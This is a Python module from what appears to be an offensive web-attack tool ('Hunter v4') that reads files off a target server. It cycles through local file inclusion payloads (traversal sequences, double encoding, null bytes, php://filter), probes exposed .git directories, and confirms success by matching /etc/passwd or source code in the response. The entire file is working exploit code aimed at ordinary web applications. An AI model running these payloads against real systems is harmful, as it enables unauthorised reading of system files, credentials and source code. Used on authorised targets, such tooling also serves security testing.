"""
Hunter v4 — Target File Reader

Read files from target via LFI, directory traversal, or source code disclosure.
"""

from core.probe import _get_session

# LFI payload templates
LFI_PAYLOADS = {
    "lfi_simple": "{path}",
    "lfi_dotdot": "....//....//....//....//{path}",
    "lfi_double_encode": "%252e%252e%252f%252e%252e%252f{path}",
    "lfi_null_byte": "{path}%00",
    "lfi_php_filter": "php://filter/convert.base64-encode/resource={path}",
}


def src_read_impl(url: str, param: str = "", technique: str = "lfi",
                  paths: list = None, method: str = "GET") -> dict:
    """Read files from target using various techniques."""
    if not paths:
        return {"error": "No paths to read"}

    session = _get_session()
    results = []

    for path in paths:
        result = _read_single(session, url, param, technique, path, method)
        results.append(result)

    return {
        "technique": technique,
        "results": results,
    }


def _read_single(session, url: str, param: str, technique: str, path: str, method: str) -> dict:
    """Attempt to read a single file."""
    try:
        if technique == "lfi" and param:
            for payload_name, payload_template in LFI_PAYLOADS.items():
                payload = payload_template.format(path=path.lstrip("/"))
                if method.upper() == "GET":
                    separator = "&" if "?" in url else "?"
                    target = f"{url}{separator}{param}={payload}"
                else:
                    target = url

                try:
                    if method.upper() == "GET":
                        resp = session.get(target, timeout=10, allow_redirects=True)
                    else:
                        resp = session.post(target, data={param: payload}, timeout=10)

                    content = resp.text
                    if _is_valid_response(content, path):
                        return {
                            "path": path,
                            "success": True,
                            "technique": payload_name,
                            "content": content,
                            "size": len(content),
                        }
                except Exception:
                    continue

            return {"path": path, "success": False, "error": "All LFI techniques failed"}

        elif technique == "git":
            git_url = f"{url.rstrip('/')}/.git/{path}"
            resp = session.get(git_url, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                return {
                    "path": path,
                    "success": True,
                    "technique": "git_disclosure",
                    "content": resp.text,
                    "size": len(resp.text),
                }
            return {"path": path, "success": False, "error": f"HTTP {resp.status_code}"}

        elif technique == "traversal":
            traversal_payloads = [
                f"....//....//....//....//{path.lstrip('/')}",
                f"..%2f..%2f..%2f..%2f{path.lstrip('/')}",
                f"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{path.lstrip('/')}",
            ]
            for payload in traversal_payloads:
                separator = "&" if "?" in url else "?"
                target = f"{url}{separator}{param}={payload}" if param else f"{url}/{payload}"
                try:
                    resp = session.get(target, timeout=10)
                    if _is_valid_response(resp.text, path):
                        return {
                            "path": path,
                            "success": True,
                            "technique": "traversal",
                            "content": resp.text,
                            "size": len(resp.text),
                        }
                except Exception:
                    continue
            return {"path": path, "success": False, "error": "Traversal failed"}

        else:
            return {"path": path, "success": False, "error": f"Unknown technique: {technique}"}

    except Exception as e:
        return {"path": path, "success": False, "error": str(e)}


def _is_valid_response(content: str, path: str) -> bool:
    """Check if response contains valid file content (not error page)."""
    if not content or len(content) < 10:
        return False

    error_indicators = ["404 not found", "403 forbidden", "error", "exception", "traceback"]
    if any(indicator in content.lower()[:200] for indicator in error_indicators):
        return False

    if "/etc/passwd" in path:
        return "root:" in content or "nobody:" in content
    if ".php" in path:
        return "<?php" in content or "<?=" in content
    if ".py" in path:
        return "import " in content or "def " in content
    if ".conf" in path or ".yml" in path:
        return True

    return True
